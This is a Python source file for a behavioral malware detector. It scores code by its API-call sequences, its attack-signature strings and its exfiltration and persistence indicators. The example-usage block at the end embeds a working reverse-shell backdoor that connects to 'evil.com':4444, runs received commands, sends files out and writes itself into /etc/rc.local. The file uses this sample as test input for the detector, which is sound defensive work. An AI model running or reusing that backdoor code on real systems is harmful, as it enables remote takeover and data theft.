# ========================================
# component_c_behavioral.py
# Component C: Behavioral Pattern Analyzer
# ========================================

"""
Thư viện cần cài:
pip install numpy networkx --break-system-packages
"""

import ast
import json
import re
from pathlib import Path
from typing import List, Dict, Set, Tuple, Optional
from collections import defaultdict, Counter, deque
import numpy as np
import hashlib

class BehavioralPatternAnalyzer:
    """
    Component C: Behavioral Pattern Analyzer
    - API call sequences
    - Temporal patterns (cross-version)
    - Known attack signatures
    """
    
    def __init__(self, signatures_path: str = 'rules/attack_signatures.json'):
        self.signatures_path = Path(signatures_path)
        self._load_signatures()
        
        # API call categories for sequence analysis
        self.api_categories = {
            'file_ops': ['open', 'read', 'write', 'remove', 'chmod', 'chown'],
            'network': ['socket', 'connect', 'send', 'recv', 'urlopen', 'requests'],
            'process': ['system', 'popen', 'Popen', 'subprocess', 'exec', 'eval'],
            'crypto': ['encrypt', 'decrypt', 'AES', 'RSA', 'hash'],
            'data_exfil': ['send', 'post', 'put', 'sendall', 'write'],
        }
        
        # Suspicious API sequences (patterns)
        self.suspicious_sequences = [
            # Data exfiltration pattern
            (['open', 'read'], ['socket', 'send']),
            (['open', 'read'], ['post', 'requests']),
            
            # Remote code execution pattern
            (['urlopen', 'read'], ['eval', 'exec']),
            (['recv', 'socket'], ['exec', 'eval']),
            
            # Persistence pattern
            (['open', 'write'], ['chmod', 'system']),
            
            # Credential theft pattern
            (['environ', 'getenv'], ['send', 'post']),
        ]
    
    def _load_signatures(self):
        """Load known attack signatures"""
        if self.signatures_path.exists():
            with open(self.signatures_path, 'r') as f:
                self.signatures = json.load(f)
        else:
            # Default attack signatures
            self.signatures = {
                "ransomware": {
                    "description": "Ransomware behavior",
                    "patterns": [
                        {"api_sequence": ["listdir", "encrypt", "remove"]},
                        {"strings": ["bitcoin", "ransom", "decrypt"]},
                    ]
                },
                "backdoor": {
                    "description": "Backdoor/Remote access",
                    "patterns": [
                        {"api_sequence": ["socket", "accept", "exec"]},
                        {"api_sequence": ["listen", "recv", "eval"]},
                    ]
                },
                "data_theft": {
                    "description": "Data exfiltration",
                    "patterns": [
                        {"api_sequence": ["open", "read", "send"]},
                        {"api_sequence": ["environ", "post"]},
                        {"strings": ["password", "token", "api_key"]},
                    ]
                },
                "trojan_downloader": {
                    "description": "Downloads additional malware",
                    "patterns": [
                        {"api_sequence": ["urlopen", "write", "chmod", "system"]},
                        {"api_sequence": ["requests.get", "open", "exec"]},
                    ]
                },
                "cryptominer": {
                    "description": "Cryptocurrency miner",
                    "patterns": [
                        {"strings": ["mining", "hashrate", "pool", "wallet"]},
                        {"api_sequence": ["socket", "connect"], "strings": ["stratum", "mining"]},
                    ]
                },
                "keylogger": {
                    "description": "Keylogger",
                    "patterns": [
                        {"strings": ["keyboard", "keypress", "pynput"]},
                        {"api_sequence": ["Listener", "on_press", "write"]},
                    ]
                },
                "info_stealer": {
                    "description": "Information stealer",
                    "patterns": [
                        {"strings": ["cookie", "password", "credential", "token"]},
                        {"api_sequence": ["open", "read", "send"]},
                    ]
                },
            }
    
    def analyze_file(self, filepath: Path, version: Optional[str] = None) -> Dict:
        """
        Analyze behavioral patterns in a file
        
        Returns:
            Dict containing behavioral features
        """
        features = {
            'filepath': str(filepath),
            'version': version,
            'analyzed': False,
            
            # API call sequences
            'api_calls': [],
            'api_call_graph': {},
            'suspicious_sequences': [],
            'api_sequence_score': 0.0,
            
            # Control flow
            'control_flow_complexity': 0,
            'function_call_depth': 0,
            'recursive_calls': [],
            
            # Attack signatures
            'matched_signatures': [],
            'signature_confidence': {},
            
            # Behavioral indicators
            'file_and_network': False,
            'crypto_and_network': False,
            'persistence_behavior': False,
            'data_exfil_behavior': False,
            
            # Temporal patterns (if version provided)
            'code_churn': 0,
            'api_changes': [],
        }
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                source_code = f.read()
            
            # Parse AST
            tree = ast.parse(source_code, filename=str(filepath))
            features['analyzed'] = True
            
            # Extract API calls
            self._extract_api_calls(tree, features)
            
            # Analyze API sequences
            self._analyze_api_sequences(features)
            
            # Build control flow
            self._analyze_control_flow(tree, features)
            
            # Match attack signatures
            self._match_signatures(source_code, features)
            
            # Detect behavioral patterns
            self._detect_behavioral_patterns(features)
            
        except SyntaxError as e:
            features['error'] = f'Syntax error: {e}'
        except Exception as e:
            features['error'] = f'Analysis error: {e}'
        
        return features
    
    def _extract_api_calls(self, tree: ast.AST, features: Dict):
        """
        Extract all API calls in execution order
        """
        api_calls = []
        
        class APICallVisitor(ast.NodeVisitor):
            def __init__(self):
                self.calls = []
                self.current_function = None
                self.call_depth = 0
            
            def visit_FunctionDef(self, node):
                old_func = self.current_function
                self.current_function = node.name
                self.generic_visit(node)
                self.current_function = old_func
            
            def visit_Call(self, node):
                self.call_depth += 1
                func_name = self._get_func_name(node.func)
                
                if func_name:
                    self.calls.append({
                        'function': func_name,
                        'line': node.lineno,
                        'in_function': self.current_function,
                        'depth': self.call_depth,
                        'args_count': len(node.args),
                    })
                
                self.generic_visit(node)
                self.call_depth -= 1
            
            def _get_func_name(self, node):
                if isinstance(node, ast.Name):
                    return node.id
                elif isinstance(node, ast.Attribute):
                    # Get full path: module.function
                    parts = []
                    current = node
                    while isinstance(current, ast.Attribute):
                        parts.append(current.attr)
                        current = current.value
                    if isinstance(current, ast.Name):
                        parts.append(current.id)
                    return '.'.join(reversed(parts))
                return ''
        
        visitor = APICallVisitor()
        visitor.visit(tree)
        
        features['api_calls'] = visitor.calls
        features['function_call_depth'] = max([c['depth'] for c in visitor.calls], default=0)
    
    def _analyze_api_sequences(self, features: Dict):
        """
        Analyze sequences of API calls for suspicious patterns
        """
        api_calls = features['api_calls']
        if not api_calls:
            return
        
        # Extract just function names in order
        call_sequence = [c['function'] for c in api_calls]
        
        # Check for known suspicious sequences
        suspicious_found = []
        
        for source_pattern, sink_pattern in self.suspicious_sequences:
            # Find if source pattern appears before sink pattern
            for i, call in enumerate(call_sequence):
                if any(s in call for s in source_pattern):
                    # Look ahead for sink pattern
                    for j in range(i+1, min(i+10, len(call_sequence))):
                        if any(s in call_sequence[j] for s in sink_pattern):
                            suspicious_found.append({
                                'source': source_pattern,
                                'sink': sink_pattern,
                                'start_line': api_calls[i]['line'],
                                'end_line': api_calls[j]['line'],
                                'distance': j - i,
                            })
                            break
        
        features['suspicious_sequences'] = suspicious_found
        features['api_sequence_score'] = len(suspicious_found) * 10  # Weight
        
        # Build API call graph (which APIs call which)
        call_graph = defaultdict(set)
        
        for i in range(len(api_calls) - 1):
            current = api_calls[i]['function']
            next_call = api_calls[i+1]['function']
            call_graph[current].add(next_call)
        
        features['api_call_graph'] = {k: list(v) for k, v in call_graph.items()}
    
    def _analyze_control_flow(self, tree: ast.AST, features: Dict):
        """
        Analyze control flow complexity
        """
        complexity = 0
        max_depth = 0
        
        def calculate_depth(node, current_depth=0):
            nonlocal max_depth, complexity
            max_depth = max(max_depth, current_depth)
            
            # Count decision points
            if isinstance(node, (ast.If, ast.For, ast.While, ast.ExceptHandler)):
                complexity += 1
            
            for child in ast.iter_child_nodes(node):
                if isinstance(child, (ast.If, ast.For, ast.While, ast.With, ast.Try)):
                    calculate_depth(child, current_depth + 1)
                else:
                    calculate_depth(child, current_depth)
        
        calculate_depth(tree)
        
        features['control_flow_complexity'] = complexity
        features['max_nesting_depth'] = max_depth
    
    def _match_signatures(self, source_code: str, features: Dict):
        """
        Match against known attack signatures
        """
        api_calls = [c['function'] for c in features['api_calls']]
        
        for sig_name, sig_data in self.signatures.items():
            confidence = 0.0
            matched_patterns = []
            
            for pattern in sig_data['patterns']:
                # Check API sequence pattern
                if 'api_sequence' in pattern:
                    seq = pattern['api_sequence']
                    if self._sequence_exists(api_calls, seq):
                        confidence += 0.3
                        matched_patterns.append({
                            'type': 'api_sequence',
                            'pattern': seq
                        })
                
                # Check string patterns
                if 'strings' in pattern:
                    for string_pattern in pattern['strings']:
                        if re.search(string_pattern, source_code, re.IGNORECASE):
                            confidence += 0.2
                            matched_patterns.append({
                                'type': 'string',
                                'pattern': string_pattern
                            })
            
            # If confidence > threshold, record match
            if confidence > 0.3:
                features['matched_signatures'].append({
                    'signature': sig_name,
                    'description': sig_data['description'],
                    'confidence': min(confidence, 1.0),
                    'matched_patterns': matched_patterns
                })
                
                features['signature_confidence'][sig_name] = min(confidence, 1.0)
    
    def _sequence_exists(self, api_calls: List[str], pattern: List[str]) -> bool:
        """
        Check if pattern exists in API call sequence
        """
        if not pattern:
            return False
        
        pattern_idx = 0
        
        for call in api_calls:
            if pattern[pattern_idx] in call:
                pattern_idx += 1
                if pattern_idx == len(pattern):
                    return True
        
        return False
    
    def _detect_behavioral_patterns(self, features: Dict):
        """
        Detect high-level behavioral patterns
        """
        api_calls = [c['function'] for c in features['api_calls']]
        
        # File + Network operations (data exfil)
        has_file_ops = any(
            any(f in call for f in self.api_categories['file_ops']) 
            for call in api_calls
        )
        has_network = any(
            any(n in call for n in self.api_categories['network']) 
            for call in api_calls
        )
        
        features['file_and_network'] = has_file_ops and has_network
        
        # Crypto + Network (C2 communication)
        has_crypto = any(
            any(c in call for c in self.api_categories['crypto']) 
            for call in api_calls
        )
        
        features['crypto_and_network'] = has_crypto and has_network
        
        # Persistence behavior (write + chmod/system)
        has_write = any('write' in call or 'open' in call for call in api_calls)
        has_exec = any(
            any(p in call for p in ['chmod', 'system', 'exec']) 
            for call in api_calls
        )
        
        features['persistence_behavior'] = has_write and has_exec
        
        # Data exfiltration (read + send)
        has_read = any('read' in call for call in api_calls)
        has_send = any(
            any(s in call for s in ['send', 'post', 'put']) 
            for call in api_calls
        )
        
        features['data_exfil_behavior'] = has_read and has_send
    
    def analyze_temporal_patterns(self, 
                                  current_version_files: List[Path],
                                  previous_version_files: List[Path]) -> Dict:
        """
        Analyze changes across versions (temporal analysis)
        
        Args:
            current_version_files: Files from current version
            previous_version_files: Files from previous version
        
        Returns:
            Temporal analysis features
        """
        print(f"\n[Component C] Analyzing temporal patterns...")
        
        temporal_features = {
            'versions_compared': 2,
            'code_churn': 0,
            'api_additions': [],
            'api_removals': [],
            'suspicious_changes': [],
            'behavior_drift_score': 0.0,
        }
        
        # Extract API calls from both versions
        current_apis = set()
        previous_apis = set()
        
        for filepath in current_version_files:
            analysis = self.analyze_file(filepath)
            if analysis.get('analyzed'):
                current_apis.update([c['function'] for c in analysis['api_calls']])
        
        for filepath in previous_version_files:
            analysis = self.analyze_file(filepath)
            if analysis.get('analyzed'):
                previous_apis.update([c['function'] for c in analysis['api_calls']])
        
        # Calculate changes
        api_additions = current_apis - previous_apis
        api_removals = previous_apis - current_apis
        
        temporal_features['api_additions'] = list(api_additions)
        temporal_features['api_removals'] = list(api_removals)
        
        # Check for suspicious additions
        dangerous_apis = {'eval', 'exec', 'system', 'socket', 'urlopen'}
        suspicious_additions = api_additions & dangerous_apis
        
        if suspicious_additions:
            temporal_features['suspicious_changes'].append({
                'type': 'dangerous_api_added',
                'apis': list(suspicious_additions)
            })
        
        # Code churn (percentage of APIs changed)
        total_apis = len(current_apis | previous_apis)
        changed_apis = len(api_additions | api_removals)
        
        if total_apis > 0:
            temporal_features['code_churn'] = changed_apis / total_apis
        
        # Behavior drift score
        if len(api_additions) > 0:
            temporal_features['behavior_drift_score'] = min(
                len(suspicious_additions) / len(api_additions),
                1.0
            )
        
        return temporal_features
    
    def extract_features_vector(self, analysis: Dict) -> Dict:
        """
        Convert behavioral analysis to ML feature vector
        
        Returns 12+ features
        """
        api_calls = analysis.get('api_calls', [])
        
        features = {
            # API call features (4)
            'total_api_calls': len(api_calls),
            'unique_api_calls': len(set(c['function'] for c in api_calls)),
            'max_call_depth': analysis.get('function_call_depth', 0),
            'api_sequence_score': analysis.get('api_sequence_score', 0),
            
            # Suspicious sequence features (2)
            'suspicious_sequence_count': len(analysis.get('suspicious_sequences', [])),
            'has_suspicious_sequence': 1 if len(analysis.get('suspicious_sequences', [])) > 0 else 0,
            
            # Control flow features (2)
            'control_flow_complexity': analysis.get('control_flow_complexity', 0),
            'max_nesting_depth': analysis.get('max_nesting_depth', 0),
            
            # Attack signature features (2)
            'matched_signature_count': len(analysis.get('matched_signatures', [])),
            'max_signature_confidence': max(
                analysis.get('signature_confidence', {}).values(),
                default=0.0
            ),
            
            # Behavioral pattern features (4)
            'file_and_network': 1 if analysis.get('file_and_network', False) else 0,
            'crypto_and_network': 1 if analysis.get('crypto_and_network', False) else 0,
            'persistence_behavior': 1 if analysis.get('persistence_behavior', False) else 0,
            'data_exfil_behavior': 1 if analysis.get('data_exfil_behavior', False) else 0,
            
            # Aggregate score (1)
            'total_behavioral_risk': (
                len(analysis.get('suspicious_sequences', [])) * 10 +
                len(analysis.get('matched_signatures', [])) * 20 +
                (1 if analysis.get('file_and_network', False) else 0) * 15 +
                (1 if analysis.get('data_exfil_behavior', False) else 0) * 25
            ),
        }
        
        return features
    
    def analyze_package(self, python_files: List[Path], 
                       package_version: Optional[str] = None) -> Dict:
        """
        Analyze behavioral patterns across entire package
        
        Returns:
            Aggregated behavioral analysis
        """
        print(f"\n[Component C] Analyzing {len(python_files)} files for behavioral patterns...")
        
        all_analyses = []
        aggregated_features = defaultdict(float)
        all_signatures = defaultdict(float)
        
        for py_file in python_files:
            analysis = self.analyze_file(py_file, version=package_version)
            if analysis.get('analyzed', False):
                all_analyses.append(analysis)
                
                # Aggregate features
                file_features = self.extract_features_vector(analysis)
                for key, value in file_features.items():
                    aggregated_features[key] += value
                
                # Aggregate signature confidences
                for sig, conf in analysis.get('signature_confidence', {}).items():
                    all_signatures[sig] = max(all_signatures[sig], conf)
        
        # Calculate package-level statistics
        num_files = len(all_analyses)
        if num_files > 0:
            for key in list(aggregated_features.keys()):
                if 'count' in key or 'score' in key or 'risk' in key:
                    pass  # Keep as sum
                else:
                    aggregated_features[key] /= num_files  # Average
        
        # Add signature summary
        aggregated_features['top_signature'] = max(
            all_signatures.items(), 
            key=lambda x: x[1],
            default=('none', 0.0)
        )[0] if all_signatures else 'none'
        
        aggregated_features['total_signatures_matched'] = len(all_signatures)
        
        result = {
            'component': 'C_behavioral',
            'files_analyzed': num_files,
            'package_version': package_version,
            'individual_analyses': all_analyses,
            'aggregated_features': dict(aggregated_features),
            'signature_summary': dict(all_signatures),
            'feature_count': len(aggregated_features)
        }
        
        print(f"  ✓ Extracted {len(aggregated_features)} behavioral features")
        print(f"  ✓ Matched {len(all_signatures)} attack signatures")
        if all_signatures:
            top_sig, top_conf = max(all_signatures.items(), key=lambda x: x[1])
            print(f"  ✓ Top signature: {top_sig} (confidence: {top_conf:.2f})")
        
        return result


# ===== EXAMPLE USAGE =====
if __name__ == '__main__':
    from pathlib import Path
    
    analyzer = BehavioralPatternAnalyzer()
    
    # Create test file with malicious behavior
    test_file = Path('test_backdoor.py')
    
    malicious_code = '''
import socket
import os
import base64

def backdoor():
    # Connect to C2 server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 4444))
    
    while True:
        # Receive command
        cmd = s.recv(1024).decode()
        
        # Execute command
        if cmd.startswith('download'):
            # Data exfiltration
            filename = cmd.split()[1]
            with open(filename, 'r') as f:
                data = f.read()
            s.send(data.encode())
        else:
            # Remote code execution
            result = os.system(cmd)
            s.send(str(result).encode())

def persistence():
    # Write backdoor to startup
    with open('/etc/rc.local', 'w') as f:
        f.write('python /tmp/backdoor.py')
    os.chmod('/etc/rc.local', 0o755)

if __name__ == '__main__':
    backdoor()
'''
    
    with open(test_file, 'w') as f:
        f.write(malicious_code)
    
    # Analyze
    result = analyzer.analyze_file(test_file)
    features = analyzer.extract_features_vector(result)
    
    print("\n" + "="*60)
    print("COMPONENT C - BEHAVIORAL ANALYSIS")
    print("="*60)
    print(f"API calls: {features['total_api_calls']}")
    print(f"Suspicious sequences: {features['suspicious_sequence_count']}")
    print(f"Matched signatures: {features['matched_signature_count']}")
    print(f"File + Network: {bool(features['file_and_network'])}")
    print(f"Data exfiltration: {bool(features['data_exfil_behavior'])}")
    print(f"Persistence: {bool(features['persistence_behavior'])}")
    print(f"Behavioral risk score: {features['total_behavioral_risk']}")
    
    if result['matched_signatures']:
        print(f"\n⚠️ Matched Attack Signatures:")
        for sig in result['matched_signatures']:
            print(f"  - {sig['signature']}: {sig['description']} "
                  f"(confidence: {sig['confidence']:.2f})")
    
    print(f"\nFeature vector: {len(features)} features")
    
    # Cleanup
    test_file.unlink()